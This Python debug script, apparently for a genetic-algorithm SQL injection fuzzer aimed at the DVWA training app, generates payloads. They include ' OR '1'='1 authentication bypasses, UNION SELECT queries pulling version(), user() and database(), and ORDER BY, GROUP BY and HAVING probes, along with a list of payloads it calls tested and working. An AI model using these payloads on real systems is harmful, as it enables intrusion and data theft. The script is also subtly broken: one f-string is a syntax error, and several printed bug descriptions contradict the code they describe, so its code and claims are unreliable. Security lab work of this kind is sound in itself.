"""
Debug SQLi Payload Generator - Diagnose dan fix bugs
"""

import random
from typing import Dict


class SQLiPayloadGenerator:
    """Generate SQLi payloads dari DNA individual"""
    
    def __init__(self, column_count: int = 2):
        self.column_count = column_count  # DVWA expects 2 columns (first_name, last_name)
        
        self.injection_types = [
            "UNION SELECT",      # 0
            "ORDER BY",          # 1
            "GROUP BY",          # 2
            "HAVING",            # 3
            "WHERE"              # 4
        ]
        
        self.quote_styles = [
            "'",                 # 0: Single quote
            '"',                 # 1: Double quote
            ""                   # 2: No quote
        ]
        
        self.comment_styles = [
            " --",               # 0: SQL comment
            " #",                # 1: MySQL comment
            ""                   # 2: No comment
        ]
        
        self.extract_types = [
            "version()",
            "user()",
            "database()",
            "current_user()",
            "1",
            "2"
        ]
        
        self.table_names = [
            "users", "admin", "accounts", "members"
        ]
    
    def generate_dna(self) -> Dict:
        """Generate random DNA"""
        dna = {
            'injection_type': random.randint(0, len(self.injection_types) - 1),
            'quote_style': random.randint(0, len(self.quote_styles) - 1),
            'comment_style': random.randint(0, len(self.comment_styles) - 1),
            'extract_type': random.randint(0, len(self.extract_types) - 1),
            'table_name': random.choice(self.table_names),
        }
        return dna
    
    def dna_to_payload_BUGGY(self, dna: Dict) -> str:
        """Convert DNA to payload - ORIGINAL BUGGY VERSION"""
        if not isinstance(dna, dict):
            raise TypeError(f"DNA harus dict, bukan {type(dna)}")
        
        injection_type = self.injection_types[dna.get('injection_type', 0)]
        quote = self.quote_styles[dna.get('quote_style', 0)]
        comment = self.comment_styles[dna.get('comment_style', 0)]
        extract = self.extract_types[dna.get('extract_type', 0)]
        table_name = dna.get('table_name', 'users')
        
        if injection_type == "UNION SELECT":
            # BUG 1: Menggunakan column_count (3) tapi DVWA expect 2
            select_list = ", ".join([extract] * self.column_count)
            payload = f"{quote} UNION SELECT {select_list} FROM {table_name}{comment}"
        
        elif injection_type == "ORDER BY":
            payload = f"{quote} ORDER BY {self.column_count}{comment}"
        
        elif injection_type == "GROUP BY":
            payload = f"{quote} GROUP BY {self.column_count}{comment}"
        
        elif injection_type == "HAVING":
            payload = f"{quote} HAVING 1=1{comment}"
        
        elif injection_type == "WHERE":
            # BUG 2: Menghasilkan "' OR ''='" (empty strings!)
            # Seharusnya "' OR '1'='1"
            payload = f"{quote} OR {quote}{quote}={quote}"
        
        else:
            payload = f"{quote} OR 1=1{comment}"
        
        return payload
    
    def dna_to_payload_FIXED(self, dna: Dict) -> str:
        """Convert DNA to payload - FIXED VERSION"""
        if not isinstance(dna, dict):
            raise TypeError(f"DNA harus dict, bukan {type(dna)}")
        
        injection_type = self.injection_types[dna.get('injection_type', 0)]
        quote = self.quote_styles[dna.get('quote_style', 0)]
        comment = self.comment_styles[dna.get('comment_style', 0)]
        extract = self.extract_types[dna.get('extract_type', 0)]
        table_name = dna.get('table_name', 'users')
        
        # FIX: Generate proper payloads untuk DVWA
        if injection_type == "UNION SELECT":
            # FIXED: Use exactly 2 columns (DVWA expect first_name, last_name)
            extract1 = extract if extract.isdigit() else "1"
            extract2 = "2"
            payload = f"{quote} UNION SELECT {extract1}, {extract2}{comment}"
        
        elif injection_type == "ORDER BY":
            # ORDER BY untuk column detection
            payload = f"{quote} ORDER BY 1{comment}"
        
        elif injection_type == "GROUP BY":
            # GROUP BY
            payload = f"{quote} GROUP BY 1{comment}"
        
        elif injection_type == "HAVING":
            # HAVING dengan GROUP BY
            payload = f"{quote} GROUP BY 1 HAVING 1=1{comment}"
        
        elif injection_type == "WHERE":
            # FIXED: Boolean-based dengan proper format
            if quote == "":
                # No quote case: 1 OR 1=1
                payload = f" OR 1=1{comment}"
            else:
                # With quote: ' OR '1'='1
                payload = f"{quote} OR {quote}1{quote}={quote}1"
        
        else:
            payload = f"{quote} OR 1=1{comment}"
        
        return payload


# ===== DEBUG SCRIPT =====
if __name__ == "__main__":
    print("=" * 90)
    print("SQLi Payload Generator - BUG ANALYSIS & FIX")
    print("=" * 90)
    
    gen = SQLiPayloadGenerator(column_count=2)  # DVWA has 2 columns
    
    print("\n✅ KNOWN WORKING PAYLOADS (TESTED IN DVWA):")
    print("-" * 90)
    working_payloads = [
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        "1' OR '1'='1' --",
        "1 OR 1=1",
        "admin' OR '1'='1",
    ]
    
    for p in working_payloads:
        print(f"  ✓ {p:<50} → Returns ALL 5 USERS")
    
    # Test DNA generation
    print("\n\n📊 RANDOM DNA PAYLOADS (5 samples):")
    print("-" * 90)
    for i in range(5):
        dna = gen.generate_dna()
        payload_buggy = gen.dna_to_payload_BUGGY(dna)
        payload_fixed = gen.dna_to_payload_FIXED(dna)
        
        injection = gen.injection_types[dna['injection_type']]
        quote_style = repr(gen.quote_styles[dna['quote_style']])
        
        print(f"\n[Sample {i+1}] {injection:<15} | Quote: {quote_style}")
        print(f"  ❌ BUGGY:  {payload_buggy}")
        print(f"  ✅ FIXED:  {payload_fixed}")
    
    print("\n\n" + "=" * 90)
    print("🔍 CRITICAL TEST CASES:")
    print("=" * 90)
    
    # Test 1: WHERE + Single Quote (MOST COMMON)
    dna_test1 = {
        'injection_type': 4,  # WHERE
        'quote_style': 0,     # Single quote
        'comment_style': 0,
        'extract_type': 0,
        'table_name': 'users',
    }
    
    print("\n[TEST 1] WHERE + Single Quote (MOST COMMON)")
    print("-" * 90)
    buggy_1 = gen.dna_to_payload_BUGGY(dna_test1)
    fixed_1 = gen.dna_to_payload_FIXED(dna_test1)
    print(f"  ❌ BUGGY OUTPUT: {repr(buggy_1)}")
    print(f"     Problem: Empty strings → \"' OR ''='' \" ← SQL SYNTAX ERROR!")
    print(f"  ✅ FIXED OUTPUT: {repr(fixed_1)}")
    print(f"     Result: Proper boolean injection")
    print(f"  ✓ MATCH EXPECTED: {fixed_1 == \"' OR '1'='1\""}")
    
    # Test 2: UNION SELECT (DATA EXTRACTION)
    dna_test2 = {
        'injection_type': 0,  # UNION SELECT
        'quote_style': 0,     # Single quote
        'comment_style': 0,
        'extract_type': 1,    # user()
        'table_name': 'users',
    }
    
    print("\n[TEST 2] UNION SELECT + Single Quote")
    print("-" * 90)
    buggy_2 = gen.dna_to_payload_BUGGY(dna_test2)
    fixed_2 = gen.dna_to_payload_FIXED(dna_test2)
    print(f"  ❌ BUGGY OUTPUT: {repr(buggy_2)}")
    print(f"     Problem: {gen.column_count} columns in UNION tapi DVWA expect 2!")
    print(f"  ✅ FIXED OUTPUT: {repr(fixed_2)}")
    print(f"     Result: Exactly 2 columns → matches DVWA schema")
    
    # Test 3: Double Quote
    dna_test3 = {
        'injection_type': 4,
        'quote_style': 1,     # Double quote
        'comment_style': 0,
        'extract_type': 0,
        'table_name': 'users',
    }
    
    print("\n[TEST 3] WHERE + Double Quote")
    print("-" * 90)
    buggy_3 = gen.dna_to_payload_BUGGY(dna_test3)
    fixed_3 = gen.dna_to_payload_FIXED(dna_test3)
    print(f"  ❌ BUGGY OUTPUT: {repr(buggy_3)}")
    print(f"  ✅ FIXED OUTPUT: {repr(fixed_3)}")
    
    # Test 4: No Quote
    dna_test4 = {
        'injection_type': 4,
        'quote_style': 2,     # No quote
        'comment_style': 0,
        'extract_type': 0,
        'table_name': 'users',
    }
    
    print("\n[TEST 4] WHERE + No Quote")
    print("-" * 90)
    buggy_4 = gen.dna_to_payload_BUGGY(dna_test4)
    fixed_4 = gen.dna_to_payload_FIXED(dna_test4)
    print(f"  ❌ BUGGY OUTPUT: {repr(buggy_4)}")
    print(f"     Problem: ' OR ''='' ← SYNTAX ERROR!")
    print(f"  ✅ FIXED OUTPUT: {repr(fixed_4)}")
    print(f"     Result: ' OR 1=1 ← Proper format")
    
    print("\n\n" + "=" * 90)
    print("📋 SUMMARY OF BUGS & FIXES:")
    print("=" * 90)
    print("""
BUG #1: Empty String in Boolean Injection
  BUGGY:  "' OR ''='" 
  FIXED:  "' OR '1'='1"
  IMPACT: SQL syntax error, no response difference detected, fitness = 0

BUG #2: Wrong Column Count in UNION
  BUGGY:  "' UNION SELECT version(), user(), database() FROM users"  (3 columns)
  FIXED:  "' UNION SELECT 1, 2"  (2 columns)
  IMPACT: Column mismatch error, payload fails silently, fitness = 0

BUG #3: No Quote Handling
  BUGGY:  " OR ''=''"  
  FIXED:  " OR 1=1"
  IMPACT: SQL syntax error, fitness = 0

RESULT:
- Semua payload generated menghasilkan error atau diabaikan
- Fitness calculator tidak bisa detect perbedaan
- GA tidak bisa evolve → stuck di fitness 0.1219
- Solution: Use FIXED version dalam payload_generator.py
    """)
    
    print("\n" + "=" * 90)
    print("✅ ACTION ITEMS:")
    print("=" * 90)
    print("""
1. Replace dna_to_payload() method di payload_generator.py dengan FIXED version
2. Change column_count dari 3 → 2
3. Test manual: python sqli_payload_debug.py
4. Run GA evolution lagi → fitness harus improve!
    """)
